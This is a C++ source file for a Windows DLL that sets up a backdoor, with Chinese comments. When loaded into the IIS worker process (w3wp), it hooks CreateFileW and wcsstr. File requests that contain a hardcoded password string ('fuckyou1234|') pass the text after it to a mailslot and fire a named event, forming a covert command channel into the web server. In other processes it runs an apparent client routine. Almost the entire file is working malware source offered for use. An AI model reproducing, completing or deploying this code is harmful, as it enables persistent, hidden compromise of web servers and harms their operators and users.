// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "HookApi.h"
#include <Psapi.h>
#pragma comment(lib,"Psapi.lib")
CApiHookEngine ApiHookEngine;

extern int MainClient();

char* Unicode2Ansi(const wchar_t* wszString)  
{  
	int ansiLen = ::WideCharToMultiByte(CP_ACP, NULL, wszString, wcslen(wszString), NULL, 0, NULL, NULL);
	char* szAnsi = new char[ansiLen + 1];
	::WideCharToMultiByte(CP_ACP, NULL, wszString, wcslen(wszString), szAnsi, ansiLen, NULL, NULL);
	szAnsi[ansiLen] = 0x00;
	return szAnsi;
}
wchar_t * __cdecl mywcsstr (
	const wchar_t * wcs1,
	const wchar_t * wcs2
	){
		wchar_t * lpTemp = NULL;
		OutputDebugString(L"Hook wcsstr()");
		ApiHookEngine.RemoveHook(L"msvcrt.dll","wcsstr");
		OutputDebugString(wcs1);
		OutputDebugString(wcs2);
		lpTemp = (wchar_t*)wcsstr(wcs1,wcs2);
		ApiHookEngine.StartHook(L"msvcrt.dll","wcsstr",(DWORD)mywcsstr);
		return lpTemp;
		
}
#define PASSWORD "fuckyou1234|"
HANDLE WINAPI myCreateFileW(
	__in     LPCWSTR lpFileName,
	__in     DWORD dwDesiredAccess,
	__in     DWORD dwShareMode,
	__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	__in     DWORD dwCreationDisposition,
	__in     DWORD dwFlagsAndAttributes,
	__in_opt HANDLE hTemplateFile
	)
{
	ApiHookEngine.RemoveHook(L"KERNEL32.DLL","CreateFileW");
	WCHAR szFile[255] = L"\\\\?\\C:\\Documents and Settings\\All Users\\Documents\\1.txt";
	char szCommand[255] = {0};
	char* szExec = Unicode2Ansi(lpFileName);
	char* szTemp = strstr(szExec,PASSWORD);
	char* szCatch = szTemp + strlen(PASSWORD);
	HANDLE hEvent = 0;
	char szError[255] = {0};
	HANDLE hFile = 0;
	DWORD dwOutLen = 0;

	if (szTemp)
	{
		OutputDebugStringA("Hook CreateFileW!");
		hFile = CreateFileW(L"\\\\.\\mailslot\\slot",GENERIC_WRITE,FILE_SHARE_READ,
			NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
		if (hFile == INVALID_HANDLE_VALUE){
			wsprintfA(szError,"myCreateFileW -- CreateFileA ErrorCode : %d\r\n",GetLastError());
			OutputDebugStringA(szError);
		}
		WriteFile(hFile,szCatch,255,&dwOutLen,NULL);
		CloseHandle(hFile);

		hEvent = OpenEvent(EVENT_ALL_ACCESS,FALSE,L"ReportEvent");
		if(hEvent == NULL){
			wsprintfA(szError,"myCreateFileW -- OpenEvent Error Code : %d",GetLastError());
			OutputDebugStringA(szError);
		}

		SetEvent(hEvent);
		Sleep(1000);

		hFile = CreateFileW(szFile,dwDesiredAccess,dwShareMode,lpSecurityAttributes,\
			dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
		ApiHookEngine.StartHook(L"KERNEL32.DLL","CreateFileW",(DWORD)myCreateFileW);
		return hFile;
	}
	hFile = CreateFileW(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,\
		dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
	ApiHookEngine.StartHook(L"KERNEL32.DLL","CreateFileW",(DWORD)myCreateFileW);
	return hFile;
}
void initBackDoor(LPVOID lpVoid)
{
	WCHAR szProcesssName[MAX_PATH] = {0};
	GetModuleBaseName(GetCurrentProcess(),NULL,szProcesssName,MAX_PATH);
	OutputDebugString(szProcesssName);
	if (wcsstr(szProcesssName,L"w3wp")){
		ApiHookEngine.StartHook(L"msvcrt.dll","wcsstr",(DWORD)mywcsstr);
		ApiHookEngine.StartHook(L"KERNEL32.DLL","CreateFileW",(DWORD)myCreateFileW);
	}
	else MainClient();
	return;
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	DWORD dwThreadId = 0;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)initBackDoor,NULL,0,&dwThreadId);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		ApiHookEngine.RemoveAllHook();
		OutputDebugString(L"dll unload");
		break;
	}
	return TRUE;
}

